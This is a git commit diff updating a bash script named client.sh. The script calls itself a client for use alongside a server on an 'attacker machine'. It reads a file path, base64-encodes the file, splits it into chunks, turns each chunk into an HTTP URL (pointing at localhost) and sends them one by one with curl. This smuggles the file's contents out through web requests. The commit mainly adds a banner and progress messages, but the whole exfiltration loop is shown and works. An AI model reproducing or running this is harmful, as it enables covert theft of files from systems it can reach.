d1a8ebe6a444e9e2ec545ce2b3e6244a8d2cc550
Vinicius Vieira <vinicius3cta@gmail.com>
2023-08-10 09:16:28 -0400

    Update client.sh

--- client.sh
+++ client.sh
@@ -1,23 +1,51 @@
 #!/bin/bash
 #
+#
+cat << "EOF"
+
+
+ █████   █████ ███████████ ███████████ █████       ███              ██████ 
+░░███   ░░███ ░█░░░███░░░█░█░░░███░░░█░░███       ░░░              ███░░███
+ ░███    ░███ ░   ░███  ░ ░   ░███  ░  ░███████   ████   ██████   ░███ ░░░ 
+ ░███████████     ░███        ░███     ░███░░███ ░░███  ███░░███ ███████   
+ ░███░░░░░███     ░███        ░███     ░███ ░███  ░███ ░███████ ░░░███░    
+ ░███    ░███     ░███        ░███     ░███ ░███  ░███ ░███░░░    ░███     
+ █████   █████    █████       █████    ████ █████ █████░░██████   █████    
+░░░░░   ░░░░░    ░░░░░       ░░░░░    ░░░░ ░░░░░ ░░░░░  ░░░░░░   ░░░░░     
+                                                                           
+
+########################################################################################################
+That's the client script. Don't forget to run the server script on you attacker machine before run this.                                                                           
+########################################################################################################
+
+
+
+EOF
+
+
 ### path to file to be sent
-echo "path to file"
+echo "Path to file to be sent"
 read path
 
+echo " "
 
 ### encoding the file
+echo "Enconding the file..."
 ENCODED=$(base64 $path)
 echo $ENCODED > /tmp/ax0c.txt
 
+echo " "
 
 ### organizing the file
+echo "Organizating the file..."
 tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
 FILE="/tmp/ax0d.txt"
 
 #HITS=`cat /tmp/ax0d.txt | wc -l`
 #echo $FILE
 
-
+echo " "
+echo "Doing the magic ;)"
 ### doing same magic... preparing file to be sent...
 for i in $(cat $FILE); do
         echo "http://localhost/$i" >> /tmp/ax0a.txt
@@ -25,17 +53,21 @@ done
 
 ### send the pattern 
 
+
+
+echo "Send the file..."
+echo " "
 ### sed the file!
 FILE2="/tmp/ax0a.txt"
 echo $FILE2
-
 
 for j in $(cat $FILE2); do
         curl $j
 done
 
 
-
+echo " "
+echo "Done!"
 
 
 
